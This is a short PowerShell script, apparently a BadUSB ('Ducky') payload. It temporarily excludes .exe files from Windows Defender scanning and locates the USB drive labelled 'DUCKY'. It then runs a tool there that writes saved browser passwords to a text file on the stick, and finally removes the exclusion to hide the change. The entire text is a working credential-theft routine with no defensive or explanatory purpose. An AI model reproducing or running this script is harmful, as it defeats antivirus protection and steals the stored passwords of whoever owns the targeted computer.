Add-MpPreference -ExclusionExtension exe -Force
$destinationLabel = "DUCKY"
$destinationLetter = Get-WmiObject -Class Win32_Volume | where {$_.Label -eq $destinationLabel} | select -expand name
cd $destinationLetter
.\wb.exe /stext passtest.txt
remove-MpPreference -ExclusionExtension exe -Force